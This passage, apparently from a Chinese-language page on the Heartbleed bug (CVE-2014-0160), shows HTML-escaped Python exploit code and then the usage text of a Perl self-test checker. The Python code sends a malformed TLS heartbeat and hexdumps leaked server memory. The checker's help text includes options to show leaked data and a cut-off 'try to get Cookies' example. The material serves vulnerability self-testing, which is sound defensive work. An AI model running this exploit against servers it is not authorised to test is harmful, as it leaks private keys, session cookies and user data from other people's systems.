        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;#39;  &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%04x&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;: &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%-48s&lt;/span&gt;&lt;span class=&quot;s&quot;&gt; &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%s&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hxdat&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pdat&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;recvall&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;length&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;timeout&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;endtime&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;timeout&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;rdata&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;#39;&amp;#39;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;remain&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;length&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;remain&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;rtime&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;endtime&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; 
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rtime&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;None&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;w&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;select&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;select&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[],&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[],&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;remain&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
            &lt;span class=&quot;c&quot;&gt;# EOF?&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;not&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;None&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;rdata&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;remain&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rdata&lt;/span&gt;
        

&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;recvmsg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;hdr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;recvall&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hdr&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;is&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;None&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;#39;Unexpected EOF receiving record header - server closed connection&amp;#39;&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;None&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;None&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;None&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;typ&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ver&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ln&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;struct&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;unpack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;#39;&amp;gt;BHH&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hdr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;pay&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;recvall&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ln&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pay&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;is&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;None&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;#39;Unexpected EOF receiving record payload - server closed connection&amp;#39;&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;None&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;None&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;None&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;#39; ... received message: type = &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%d&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;, ver = &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%04x&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;, length = &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%d&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;#39;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;typ&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ver&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pay&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;typ&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ver&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pay&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;hit_hb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;True&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;typ&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ver&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pay&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;recvmsg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;typ&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;is&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;None&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;#39;No heartbeat response received, server likely not vulnerable&amp;#39;&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;False&lt;/span&gt;

        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;typ&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;24&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;#39;Received heartbeat response:&amp;#39;&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;hexdump&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pay&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pay&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;#39;WARNING: server returned more data than it should - server is vulnerable!&amp;#39;&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;#39;Server processed malformed heartbeat, but did not return any extra data.&amp;#39;&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;True&lt;/span&gt;

        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;typ&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;21&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;#39;Received alert:&amp;#39;&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;hexdump&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pay&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;#39;Server returned error, likely not vulnerable&amp;#39;&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;False&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;opts&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;args&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;options&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;parse_args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;options&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;print_help&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;AF_INET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SOCK_STREAM&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;#39;Connecting...&amp;#39;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stdout&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;flush&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;connect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;opts&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;#39;Sending Client Hello...&amp;#39;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stdout&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;flush&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hello&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;#39;Waiting for Server Hello...&amp;#39;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stdout&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;flush&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;True&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;typ&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ver&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pay&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;recvmsg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;typ&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;bp&quot;&gt;None&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;#39;Server closed connection without sending Server Hello.&amp;#39;&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;
        &lt;span class=&quot;c&quot;&gt;# Look for server hello done message.&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;typ&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;22&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;and&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ord&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pay&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x0E&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;#39;Sending heartbeat request...&amp;#39;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stdout&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;flush&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;hit_hb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__name__&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&amp;#39;__main__&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;ul&gt;
  &lt;li&gt;自我測試工具 &lt;a href=&quot;https://github.com/noxxi/p5-scripts/blob/master/check-ssl-heartbleed.pl&quot;&gt;https://github.com/noxxi/p5-scripts/blob/master/check-ssl-heartbleed.pl&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;使用方法直接執行「perl check-ssl-heartbleed.pl mail.XXXXXX.gov.tw:443」，可在網域名稱後指定特定 SSL 連接埠。&lt;/p&gt;

&lt;p&gt;使用說明：&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-console&quot; data-lang=&quot;console&quot;&gt;&lt;span class=&quot;go&quot;&gt;Check if server is vulnerable against heartbleet SSL attack (CVE-2014-0160)&lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;Usage: check-ssl-heartbleed.pl [ --starttls proto[:arg] ] [ --timeout T ] host:port&lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;  --starttls proto[:arg] - start plain and upgrade to SSL with&lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;			   starttls protocol (imap,smtp,http,pop)&lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;  -T|--timeout T         - use timeout (default 5)&lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;  -H|--heartbeats N      - number of heartbeats (default 1)&lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;  -s|--show-data [L]     - show heartbeat response if vulnerable, optional&lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;                           parameter L specifies number of bytes per line (16)&lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;  -R|--show-regex-data R - show data matching perl regex R. Option can be&lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;                           used multiple times&lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;  -q|--quiet             - don&amp;#39;t show anything, exit 1 if vulnerable&lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;  -h|--help              - this screen&lt;/span&gt;

&lt;span class=&quot;go&quot;&gt;Examples:&lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;  # check direct www, imaps .. server&lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;  check-ssl-heartbleed.pl www.google.com:443&lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;  check-ssl-heartbleed.pl www.google.com:https&lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;  check-ssl-heartbleed.pl mail.google.com:imaps&lt;/span&gt;

&lt;span class=&quot;go&quot;&gt;  # try to get Cookies&lt;/span&gt;
